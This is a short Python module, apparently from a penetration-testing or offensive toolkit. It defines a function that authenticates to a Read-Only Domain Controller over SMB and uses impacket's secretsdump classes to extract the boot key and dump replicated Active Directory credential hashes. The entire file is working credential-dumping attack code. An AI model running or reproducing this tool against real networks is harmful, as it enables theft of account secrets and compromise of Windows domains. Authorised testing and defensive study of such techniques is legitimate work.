"""RODC (Read-Only Domain Controller) credential dumping tool.

Authenticates over SMB, then uses impacket's `RemoteOperations` +
`NTDSHashes` (the same classes impacket's own secretsdump drives) to pull
the boot key and dump replicated secrets. Against a real RODC this
naturally returns only what the RODC is allowed to cache/replicate
(its `msDS-RevealOnDemandGroup` membership already limits that at the
protocol level) -- no extra filtering needed here. impacket is imported
lazily since it's a heavy dependency not needed to import this module.
"""
from __future__ import annotations


def rodc_dump(target_host: str, domain: str, username: str = "", password: str = "") -> dict:
    if not username or not password:
        raise ValueError("rodc_dump requires username and password")

    from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
    from impacket.smbconnection import SMBConnection

    smb_connection = SMBConnection(target_host, target_host)
    smb_connection.login(username, password, domain)

    remote_ops = RemoteOperations(smb_connection, False, target_host)
    boot_key = remote_ops.getBootKey()

    dumped_secrets: list[str] = []
    ntds_hashes = NTDSHashes(
        None,
        boot_key,
        isRemote=True,
        remoteOps=remote_ops,
        perSecretCallback=lambda _secret_type, secret: dumped_secrets.append(secret),
    )
    try:
        ntds_hashes.dump()
    finally:
        ntds_hashes.finish()
        remote_ops.finish()

    return {
        "target_host": target_host,
        "domain": domain,
        "dumped_secrets": dumped_secrets,
    }
